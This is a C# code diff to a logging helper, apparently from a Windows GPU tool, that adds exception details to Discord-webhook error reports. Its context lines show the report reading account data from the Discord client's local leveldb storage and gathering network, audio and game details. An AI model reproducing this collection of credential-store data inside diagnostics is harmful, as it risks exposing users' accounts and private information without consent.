@@ -71,7 +71,7 @@ public static partial class LogHelper
 
     public static async Task LogError(Exception ex, IEnumerable<GpuInfo> selectedGpus = null, string actionTitle = null)
     {
-        var embed = await GetOverview(selectedGpus, ex);
+        var embed = await GetOverview(selectedGpus, ex, actionTitle);
         var webhookPayload = new JsonObject
         {
             ["embeds"] = new JsonArray { (JsonNode)embed }
@@ -181,7 +181,7 @@ public static partial class LogHelper
         }
     }
 
-    private static async Task<JsonObject> GetOverview(IEnumerable<GpuInfo> selectedGpus = null, Exception ex = null)
+    private static async Task<JsonObject> GetOverview(IEnumerable<GpuInfo> selectedGpus = null, Exception ex = null, string actionTitle = null)
     {
         // local discord
         var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
@@ -481,6 +481,15 @@ public static partial class LogHelper
         AddField("NICs", nics);
         AddField("Audio Devices", audioInfo);
         AddField("Games", games);
+        if (ex != null)
+        {
+            string errorDetails = $"Type: {ex.GetType().FullName}\nMessage: {ex.Message}";
+            if (!string.IsNullOrEmpty(actionTitle))
+            {
+                errorDetails += $"\nAction Title: {actionTitle}";
+            }
+            AddField("Error Details", errorDetails);
+        }
         AddField("OS Build", OSHelper.GetWindowsVersionString(), true);
         AddField("Installation Details", installationDetails, true);
 
